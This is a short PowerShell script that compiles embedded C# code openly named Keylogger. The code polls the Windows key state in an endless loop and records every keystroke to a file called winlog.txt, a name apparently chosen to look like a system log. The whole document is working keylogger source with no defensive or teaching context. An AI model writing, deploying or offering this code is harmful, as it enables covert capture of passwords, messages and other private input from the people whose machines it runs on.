$logPath = "C:\Users\Public\winlog.txt"  # Gebruik een veilige locatie

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int vKey);
    
    public static void Main() {
        string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "winlog.txt");  
        while (true) {
            for (int i = 0; i < 255; i++) {
                if (GetAsyncKeyState(i) != 0) {
                    File.AppendAllText(filePath, ((ConsoleKey)i).ToString());
                }
            }
        }
    }
}
"@ -Language CSharp
